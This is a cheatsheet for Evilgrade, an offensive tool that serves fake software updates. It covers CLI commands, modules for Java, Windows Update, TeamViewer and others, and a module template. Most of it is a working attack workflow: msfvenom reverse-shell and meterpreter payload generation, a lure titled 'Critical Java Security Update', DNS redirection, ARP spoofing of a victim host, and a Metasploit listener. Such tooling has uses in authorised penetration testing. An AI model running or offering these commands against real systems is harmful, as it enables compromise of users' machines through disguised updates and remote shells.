# Evilgrade Cheatsheet

## Quick Start

```bash
# Launch Evilgrade
sudo evilgrade

# List modules
evilgrade> show modules

# Configure a module
evilgrade> configure sunjava
evilgrade(sunjava)> set agent /tmp/payload.exe

# Start services
evilgrade> start

# Check status
evilgrade> show status
```

## CLI Commands

| Command | Description |
|---|---|
| `show modules` | List all available modules |
| `show active` | List active modules |
| `show options` | Show global options |
| `show vhosts` | Show virtual hostnames |
| `show status` | Show services and victims |
| `configure <module>` / `conf <module>` | Enter module config |
| `conf` (no args) | Return to global config |
| `set <option> <value>` | Set a variable |
| `start` | Start DNS + Web server |
| `stop` | Stop DNS + Web server |
| `restart` | Restart services |
| `reload` | Reload modules from disk |
| `exit` | Quit Evilgrade |

## Global Options

```bash
evilgrade> show options
# DNSEnable    = 1      # Enable DNS Server
# DNSAnswerIp  = 127.0.0.1  # DNS resolve target IP
# DNSPort      = 53     # DNS listen port
# debug        = 0      # Debug mode
# port         = 80     # Web server HTTP port
# sslport      = 443    # Web server HTTPS port

evilgrade> set DNSAnswerIp 192.168.1.50
evilgrade> set debug 1
```

## Module Configuration

```bash
evilgrade> configure sunjava
evilgrade(sunjava)> show options
# agent      = ./agent/reverseshell.exe   # Payload binary
# title      = Critical update            # Update dialog title
# description = This critical update...   # Update description
# website    = http://java.com/info       # Info link
# enable     = 1                          # Module enabled

# Set static payload
evilgrade(sunjava)> set agent /tmp/payload.exe

# Set dynamic payload (generates per-request)
evilgrade(sunjava)> set agent '["/usr/bin/msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 X > <%OUT%>/tmp/update.exe<%OUT%>"]'
```

## Dynamic Payload Syntax

```bash
# Basic dynamic generation
set agent '["command <%OUT%>/tmp/file.exe<%OUT%>"]'

# With randomization
set agent '["./generate -o <%OUT%>/tmp/update".int(rand(256)).".exe<%OUT%>"]'

# msfvenom integration
set agent '["/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 X > <%OUT%>/tmp/shell.exe<%OUT%>"]'
```

## Common Modules

```bash
# Java
configure sunjava
configure javaupdate

# Apple
configure appleupdate

# Windows
configure windowsupdate

# Communication
configure teamviewer
configure notepadplus
configure skype

# Utilities
configure vmware
configure virtualbox
configure filezilla
configure winscp

# Package managers
configure apt      # Ubuntu < 10.04
configure cpan
```

## Full Attack Workflow

```bash
# 1. Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o /tmp/payload.exe

# 2. Configure Evilgrade
sudo evilgrade
evilgrade> configure sunjava
evilgrade(sunjava)> set agent /tmp/payload.exe
evilgrade(sunjava)> set title "Critical Java Security Update"
evilgrade(sunjava)> conf

# 3. Configure DNS redirection
evilgrade> set DNSAnswerIp 192.168.1.50
evilgrade> start

# 4. Set up listener (separate terminal)
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; exploit"

# 5. Enable ARP spoofing (separate terminal)
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# 6. Monitor victims
evilgrade> show status
```

## Response Types

| Type | Description | Use Case |
|---|---|---|
| `file` | Serve static file | Config XML, HTML pages |
| `string` | Serve inline content | Dynamic responses |
| `agent` | Serve configured payload | Binary delivery |
| `install` | Signal installation complete | Callback/tracking |

## Module Development Template

```perl
package modules::customapp;
my $base = {
    'name'    => 'Custom App',
    'version' => '1.0',
    'appver'  => '<= 2.0',
    'author'  => ['Author'],
    'vh'      => '(update.customapp.com)',
    'request' => [
        { 'req' => '^/check$', 'type' => 'string', 'string' => '<update>...</update>', 'parse' => 1 },
        { 'req' => '\.exe$',   'type' => 'agent',  'bin' => 1 },
    ],
    'options' => {
        'agent'   => { 'val' => './agent/payload.exe', 'desc' => 'Agent to inject' },
        'enable'  => { 'val' => 1, 'desc' => 'Status' },
        'title'   => { 'val' => 'Update', 'desc' => 'Update title' },
    }
};
```

## Prerequisites Checklist

```bash
# Perl modules
cpan install Data::Dump Digest::MD5 Time::HiRes RPC::XML

# Ports needed
sudo netstat -tlnp | grep 53    # DNS
sudo netstat -tlnp | grep 80    # HTTP
sudo netstat -tlnp | grep 443   # HTTPS

# Verify payload
file /tmp/payload.exe           # Should be PE32 executable
ls -la /tmp/payload.exe         # Should be > 0 bytes
```

## Troubleshooting

```bash
# Permission denied on port 53
sudo evilgrade

# No victims
# Verify DNS resolution: nslookup update.vendor.com
# Check services: evilgrade> show status
# Verify module is active: evilgrade> show active

# Payload 0 bytes
# Regenerate: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o /tmp/payload.exe
# Verify: ls -la /tmp/payload.exe

# Module not found
evilgrade> show modules        # Check exact name
evilgrade> reload              # Reload after changes

# SSL issues
ls certs/                      # Check certificate files
# Import Evilgrade CA into victim trust store for HTTPS
```
